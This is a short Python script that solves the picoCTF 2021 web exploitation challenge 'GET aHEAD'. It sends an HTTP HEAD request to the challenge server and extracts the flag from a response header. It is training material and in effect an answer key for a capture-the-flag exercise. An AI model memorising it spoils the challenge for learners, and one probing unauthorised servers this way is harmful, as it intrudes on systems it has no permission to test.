# picoCTF challenge GET aHEAD.

# Tags:
# 20 points
# picoCTF 2021
# Web Exploitation

# Description:
# Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:45028/

import requests
 
url = "http://mercury.picoctf.net:45028"

s = requests.Session()

# Sends a HEAD method request instead of the usual GET method request.
r = s.head(url)

# Prints the received headers.
print("\n\nSending a HEAD method request to " + url + " with the following response header:")
print(r.headers)


flag = r.headers['flag']

print("\n\n\nThe flag is :" + flag + "\n\n")


